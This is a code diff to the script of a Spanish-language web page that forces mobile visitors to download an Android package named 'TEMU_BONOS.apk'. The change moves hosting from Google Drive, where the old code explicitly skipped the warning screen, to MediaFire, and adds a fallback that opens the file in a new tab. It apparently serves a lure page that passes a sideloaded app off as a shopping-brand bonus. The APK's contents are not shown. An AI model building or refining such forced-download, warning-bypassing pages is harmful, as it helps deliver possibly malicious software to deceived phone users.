@@ -733,12 +733,13 @@
 </div>
 
 <script>
-    // ID de tu archivo en Google Drive
-    const FILE_ID = "10i0bwccmKMtLtsak979gvfRnCu5Tbc55";
+    // ✅ ENLACE DE MEDIAFIRE (descarga directa en móviles)
+    // Se fuerza la descarga directa con el parámetro ?dkey=1
+    const apkUrl = "https://www.mediafire.com/file/rcjk3w5qlkzjl7e/TEMU_BONOS.apk/file?dkey=1";
     
-    // Enlace directo para descargar desde Google Drive sin pantalla de advertencia
-    const apkUrl = `https://drive.usercontent.google.com/download?id=${FILE_ID}&export=download&confirm=t`;
-
+    // Alternativa: si el anterior no funciona, usa este:
+    // const apkUrl = "https://download.mediafire.com/rcjk3w5qlkzjl7e/TEMU_BONOS.apk";
+    
     // Generar partículas
     function createParticles() {
         const particles = document.getElementById('particles');
@@ -765,24 +766,31 @@
         }
     }, 30000);
 
-    // Función de descarga REAL del APK desde Google Drive
+    // Función de descarga desde MediaFire (compatible con móviles)
     function downloadAPK() {
         // Mostrar modal
         document.getElementById('downloadModal').style.display = 'flex';
         
         setTimeout(() => {
-            // Crear enlace de descarga directa
+            // Método 1: Usar link directo
             const link = document.createElement('a');
             link.href = apkUrl;
-            link.download = 'temu_bonos.apk';
+            link.download = 'TEMU_BONOS.apk';
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
             
+            // Fallback: si no funciona, abrir en nueva pestaña
+            setTimeout(() => {
+                if (document.hidden !== undefined) {
+                    window.open(apkUrl, '_blank');
+                }
+            }, 500);
+            
             setTimeout(() => {
                 closeModal();
                 mostrarMensajeExito();
-            }, 1500);
+            }, 2000);
         }, 1500);
     }
 
